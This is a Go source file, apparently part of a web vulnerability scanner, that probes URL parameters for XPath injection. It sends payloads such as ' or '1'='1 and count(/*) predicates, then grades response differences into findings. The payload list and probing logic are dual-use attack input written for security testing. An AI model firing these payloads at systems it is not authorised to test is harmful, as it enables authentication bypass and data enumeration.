package xpath

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

type XPathPayload struct {
	Name    string
	Payload string
}

type xpathBaseline struct {
	bodyLower    string
	bodyHash     string
	status       int
	fingerprint  utils.ResponseFingerprint
	authGateSeen bool
}

type xpathEvidence struct {
	param         string
	payloadName   string
	target        string
	status        int
	signal        string
	severity      string
	confidence    string
	deterministic bool
	baseHash      string
	attackHash    string
}

type xpathProbe struct {
	param       string
	payloadName string
	target      string
	status      int
	bodyLower   string
	bodyHash    string
	fp          utils.ResponseFingerprint
}

var XPathPayloads = []XPathPayload{
	{"XPath Boolean TRUE", "' or '1'='1"},
	{"XPath Boolean FALSE", "' or '1'='2"},
	{"XPath Enumeration", "//*"},
	{"XPath Count TRUE", "' and count(/*)>0 and '1'='1"},
	{"XPath Count FALSE", "' and count(/*)=0 and '1'='1"},
	{"XPath Name Discovery", "x' or name()='username' or 'x'='y"},
}

var XPathErrors = []string{
	"xpathexception",
	"simplexmlelement::xpath()",
	"xmlxpatheval: evaluation failed",
	"domxpath::query()",
}

// Scan tests for XPath Injection and emits one root-cause finding per endpoint.
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if strings.TrimSpace(baseURL) == "" {
		return
	}
	baseURL = ensureTrailingSlash(baseURL)

	params := []string{"id", "user", "name", "search", "query", "xml"}
	baselines := collectBaselines(baseURL, params, client)
	if len(baselines) == 0 {
		return
	}

	affectedParams := make(map[string]bool)
	allEvidence := make([]xpathEvidence, 0, 10)
	authGateParams := 0

	for _, param := range params {
		base, ok := baselines[param]
		if !ok {
			continue
		}
		if base.authGateSeen {
			authGateParams++
			continue
		}

		probes := make(map[string]xpathProbe, len(XPathPayloads))
		for _, payload := range XPathPayloads {
			target, status, bodyLower, bodyHash, fp, ok := requestPayload(baseURL, param, payload.Payload, client)
			if !ok {
				continue
			}
			if utils.IsRedirectAwareIdentical(base.fingerprint, fp) {
				continue
			}
			if utils.IsAuthGateFingerprint(fp, bodyLower) {
				continue
			}
			probes[payload.Name] = xpathProbe{
				param:       param,
				payloadName: payload.Name,
				target:      target,
				status:      status,
				bodyLower:   bodyLower,
				bodyHash:    bodyHash,
				fp:          fp,
			}

			signal, severity, confidence, deterministic, matched := evaluateXPathSignal(payload, status, bodyLower, base)
			if !matched {
				continue
			}
			if bodyHash == base.bodyHash && status == base.status {
				continue
			}

			affectedParams[param] = true
			allEvidence = append(allEvidence, xpathEvidence{
				param:         param,
				payloadName:   payload.Name,
				target:        target,
				status:        status,
				signal:        signal,
				severity:      severity,
				confidence:    confidence,
				deterministic: deterministic,
				baseHash:      shortHash(base.bodyHash),
				attackHash:    shortHash(bodyHash),
			})
		}

		for _, ev := range analyzeDeterministicPairEvidence(param, base, probes) {
			affectedParams[param] = true
			allEvidence = append(allEvidence, ev)
		}
	}

	if len(allEvidence) == 0 {
		if authGateParams > 0 && authGateParams == len(baselines) {
			onFound(core.Finding{
				Type:       "Auth-Gated Endpoint (Unauthenticated Scan)",
				Target:     canonicalEndpoint(baseURL),
				Detail:     "Endpoint consistently returns authentication gate behavior (302/401/403 with login/auth redirect patterns). Injection validation skipped until authenticated context is provided.",
				Severity:   "Info",
				Confidence: "noisy",
			})
		}
		return
	}

	representative := pickRepresentativeEvidence(allEvidence, 3)
	overallSeverity := maxSeverity(allEvidence)
	overallConfidence := bestConfidence(allEvidence)
	detail := buildSummaryDetail(affectedParams, representative, allEvidence, len(allEvidence))

	target := canonicalEndpoint(baseURL)
	fmt.Printf("[!] POSITIVE MATCH: XPath Injection at %s (vectors=%d)\n", target, len(allEvidence))
	onFound(core.Finding{
		Type:       "XPath Injection",
		Target:     target,
		Detail:     detail,
		Severity:   overallSeverity,
		Confidence: overallConfidence,
	})
}

func evaluateXPathSignal(p XPathPayload, status int, bodyLower string, base xpathBaseline) (signal, severity, confidence string, deterministic, matched bool) {
	if strings.Contains(bodyLower, strings.ToLower(p.Payload)) {
		return "", "", "", false, false
	}

	for _, errStr := range XPathErrors {
		if strings.Contains(bodyLower, errStr) && !strings.Contains(base.bodyLower, errStr) {
			return fmt.Sprintf("XPath error found: %s (deterministic parser error; exploit chain not yet proven)", errStr), "Medium", "probable", true, true
		}
	}

	if p.Name == "XPath Enumeration" {
		if signal, ok := detectStructuralXMLLeak(base.bodyLower, bodyLower); ok {
			return signal, "High", "confirmed", true, true
		}
	}

	if status == http.StatusOK {
		successIndicators := []string{"admin", "account", "password", "root"}
		for _, indicator := range successIndicators {
			if strings.Contains(bodyLower, indicator) &&
				!strings.Contains(base.bodyLower, indicator) &&
				(strings.Contains(p.Payload, "1=1") || strings.Contains(p.Payload, "//*") || strings.Contains(p.Payload, "count(/*)")) {
				return fmt.Sprintf("Behavioral indicator changed: %s (heuristic only; no boolean/count/error deterministic proof)", indicator), "Info", "noisy", false, true
			}
		}
	}

	return "", "", "", false, false
}

func buildSummaryDetail(affected map[string]bool, reps []xpathEvidence, all []xpathEvidence, total int) string {
	params := make([]string, 0, len(affected))
	for p := range affected {
		params = append(params, p)
	}
	sort.Strings(params)

	proofDepth := highestXPathProofDepth(all)

	var b strings.Builder
	switch {
	case proofDepth >= 3:
		b.WriteString("Root Cause: XML Query Injection (XPath)\n")
		b.WriteString("Impact:\n")
		b.WriteString(" - XPath predicate manipulation\n")
		b.WriteString(" - Authentication filter bypass\n")
		b.WriteString(" - XML data enumeration\n")
	case proofDepth == 2:
		b.WriteString("Root Cause: XML Query Parser Error Disclosure\n")
		b.WriteString("Impact:\n")
		b.WriteString(" - Deterministic XPath parser error signal\n")
		b.WriteString(" - Manual exploitation confirmation required\n")
	default:
		b.WriteString("Root Cause: XML Query Handling Anomaly (Heuristic Signal)\n")
		b.WriteString("Impact:\n")
		b.WriteString(" - Behavior changed under XPath-like payloads\n")
		b.WriteString(" - No deterministic injection proof yet\n")
	}
	if proofDepth < 3 {
		b.WriteString("Validation status: informational signal only (no deterministic boolean/count/error proof).\n")
	}
	b.WriteString(fmt.Sprintf("Affected parameters: %s\n", strings.Join(params, ", ")))
	b.WriteString(fmt.Sprintf("Representative payload evidence (max 3 of %d vectors):\n", total))

	for i, ev := range reps {
		b.WriteString(fmt.Sprintf("%d. payload=%s param=%s signal=%s fingerprint=%s->%s target=%s\n",
			i+1, ev.payloadName, ev.param, ev.signal, ev.baseHash, ev.attackHash, ev.target))
	}
	return strings.TrimSpace(b.String())
}

func containsDeterministicXPathEvidence(reps []xpathEvidence) bool {
	for _, ev := range reps {
		if ev.deterministic {
			return true
		}
	}
	return false
}

func analyzeDeterministicPairEvidence(param string, base xpathBaseline, probes map[string]xpathProbe) []xpathEvidence {
	out := make([]xpathEvidence, 0, 2)

	if t, ok := probes["XPath Boolean TRUE"]; ok {
		if f, okFalse := probes["XPath Boolean FALSE"]; okFalse {
			if signal, okDiff := detectDeterministicDifferential(base, t, f, "boolean"); okDiff {
				out = append(out, xpathEvidence{
					param:         param,
					payloadName:   "XPath Boolean Pair",
					target:        t.target,
					status:        t.status,
					signal:        signal,
					severity:      "High",
					confidence:    "confirmed",
					deterministic: true,
					baseHash:      shortHash(base.bodyHash),
					attackHash:    shortHash(t.bodyHash),
				})
			}
		}
	}

	if t, ok := probes["XPath Count TRUE"]; ok {
		if f, okFalse := probes["XPath Count FALSE"]; okFalse {
			if signal, okDiff := detectDeterministicDifferential(base, t, f, "count"); okDiff {
				out = append(out, xpathEvidence{
					param:         param,
					payloadName:   "XPath Count Pair",
					target:        t.target,
					status:        t.status,
					signal:        signal,
					severity:      "High",
					confidence:    "confirmed",
					deterministic: true,
					baseHash:      shortHash(base.bodyHash),
					attackHash:    shortHash(t.bodyHash),
				})
			}
		}
	}

	return out
}

func detectDeterministicDifferential(base xpathBaseline, trueProbe, falseProbe xpathProbe, mode string) (string, bool) {
	// Ignore auth-gated or identical redirect/login behavior.
	if utils.IsRedirectAwareIdentical(trueProbe.fp, falseProbe.fp) {
		return "", false
	}

	trueDiffersFromBase := trueProbe.status != base.status || trueProbe.bodyHash != base.bodyHash || !utils.IsRedirectAwareIdentical(base.fingerprint, trueProbe.fp)
	falseMatchesBase := falseProbe.bodyHash == base.bodyHash || utils.IsRedirectAwareIdentical(base.fingerprint, falseProbe.fp)
	trueFalseDifferent := trueProbe.status != falseProbe.status || trueProbe.bodyHash != falseProbe.bodyHash

	if !trueDiffersFromBase || !falseMatchesBase || !trueFalseDifferent {
		return "", false
	}

	switch mode {
	case "boolean":
		return fmt.Sprintf("Boolean true/false differential confirmed (TRUE=%d/%s FALSE=%d/%s)", trueProbe.status, shortHash(trueProbe.bodyHash), falseProbe.status, shortHash(falseProbe.bodyHash)), true
	case "count":
		return fmt.Sprintf("count() differential confirmed (TRUE=%d/%s FALSE=%d/%s)", trueProbe.status, shortHash(trueProbe.bodyHash), falseProbe.status, shortHash(falseProbe.bodyHash)), true
	default:
		return "Deterministic differential confirmed", true
	}
}

func detectStructuralXMLLeak(baseBody, attackBody string) (string, bool) {
	base := strings.ToLower(baseBody)
	attack := strings.ToLower(attackBody)

	markers := []string{
		"<?xml", "xmlns:", "<result>", "<results>", "<node>", "<nodes>", "<user>", "<users>", "<username>", "<password>",
	}

	newMarkers := 0
	for _, marker := range markers {
		if strings.Contains(attack, marker) && !strings.Contains(base, marker) {
			newMarkers++
		}
	}
	if newMarkers < 2 {
		return "", false
	}
	return fmt.Sprintf("Structural XML leak detected (new_xml_markers=%d)", newMarkers), true
}

func highestXPathProofDepth(all []xpathEvidence) int {
	depth := 0
	for _, ev := range all {
		s := strings.ToLower(ev.signal)
		switch {
		case strings.Contains(s, "boolean true/false differential confirmed"),
			strings.Contains(s, "count() differential confirmed"),
			strings.Contains(s, "structural xml leak detected"):
			if depth < 3 {
				depth = 3
			}
		case strings.Contains(s, "xpath error found"), ev.deterministic:
			if depth < 2 {
				depth = 2
			}
		case strings.Contains(s, "behavioral indicator changed"), strings.Contains(s, "heuristic"):
			if depth < 1 {
				depth = 1
			}
		}
	}
	return depth
}

func collectBaselines(baseURL string, params []string, client *http.Client) map[string]xpathBaseline {
	out := make(map[string]xpathBaseline, len(params))
	for _, param := range params {
		u, err := url.Parse(baseURL)
		if err != nil {
			continue
		}
		q := u.Query()
		q.Set(param, "bhyakugan_xpath_control")
		u.RawQuery = q.Encode()

		resp, err := client.Get(u.String())
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyLower := strings.ToLower(string(body))
		fp := utils.BuildResponseFingerprint(resp, body)

		out[param] = xpathBaseline{
			bodyLower:    bodyLower,
			bodyHash:     hashBytes(body),
			status:       resp.StatusCode,
			fingerprint:  fp,
			authGateSeen: utils.IsAuthGateFingerprint(fp, bodyLower),
		}
	}
	return out
}

func requestPayload(baseURL, param, payload string, client *http.Client) (target string, status int, bodyLower, bodyHash string, fp utils.ResponseFingerprint, ok bool) {
	u, err := url.Parse(baseURL)
	if err != nil {
		return "", 0, "", "", utils.ResponseFingerprint{}, false
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	target = u.String()

	resp, err := client.Get(target)
	if err != nil {
		return "", 0, "", "", utils.ResponseFingerprint{}, false
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	bodyLower = strings.ToLower(string(body))
	fp = utils.BuildResponseFingerprint(resp, body)
	return target, resp.StatusCode, bodyLower, hashBytes(body), fp, true
}

func pickRepresentativeEvidence(all []xpathEvidence, max int) []xpathEvidence {
	if len(all) == 0 || max <= 0 {
		return nil
	}
	sorted := append([]xpathEvidence(nil), all...)
	sort.SliceStable(sorted, func(i, j int) bool {
		if sorted[i].deterministic != sorted[j].deterministic {
			return sorted[i].deterministic
		}
		ri := severityRank(sorted[i].severity)
		rj := severityRank(sorted[j].severity)
		if ri != rj {
			return ri > rj
		}
		if sorted[i].param != sorted[j].param {
			return sorted[i].param < sorted[j].param
		}
		return sorted[i].payloadName < sorted[j].payloadName
	})
	if len(sorted) > max {
		sorted = sorted[:max]
	}
	return sorted
}

func maxSeverity(all []xpathEvidence) string {
	best := "Info"
	for _, ev := range all {
		if severityRank(ev.severity) > severityRank(best) {
			best = ev.severity
		}
	}
	return normalizeSeverity(best)
}

func bestConfidence(all []xpathEvidence) string {
	best := "noisy"
	bestRank := confidenceRank(best)
	for _, ev := range all {
		rank := confidenceRank(ev.confidence)
		if rank > bestRank {
			best = ev.confidence
			bestRank = rank
		}
	}
	return strings.ToLower(strings.TrimSpace(best))
}

func severityRank(sev string) int {
	switch normalizeSeverity(sev) {
	case "Critical":
		return 5
	case "High":
		return 4
	case "Medium":
		return 3
	case "Low":
		return 2
	default:
		return 1
	}
}

func normalizeSeverity(sev string) string {
	switch strings.ToLower(strings.TrimSpace(sev)) {
	case "critical":
		return "Critical"
	case "high":
		return "High"
	case "medium":
		return "Medium"
	case "low":
		return "Low"
	default:
		return "Info"
	}
}

func confidenceRank(conf string) int {
	switch strings.ToLower(strings.TrimSpace(conf)) {
	case "confirmed":
		return 3
	case "probable":
		return 2
	default:
		return 1
	}
}

func hashBytes(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

func shortHash(h string) string {
	if len(h) < 12 {
		return h
	}
	return h[:12]
}

func ensureTrailingSlash(u string) string {
	if strings.HasSuffix(u, "/") {
		return u
	}
	return u + "/"
}

func canonicalEndpoint(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		if idx := strings.Index(raw, "?"); idx != -1 {
			return raw[:idx]
		}
		return raw
	}
	u.RawQuery = ""
	u.Fragment = ""
	clean := u.String()
	if strings.HasSuffix(clean, "/") && u.Path != "/" {
		return strings.TrimSuffix(clean, "/")
	}
	return clean
}
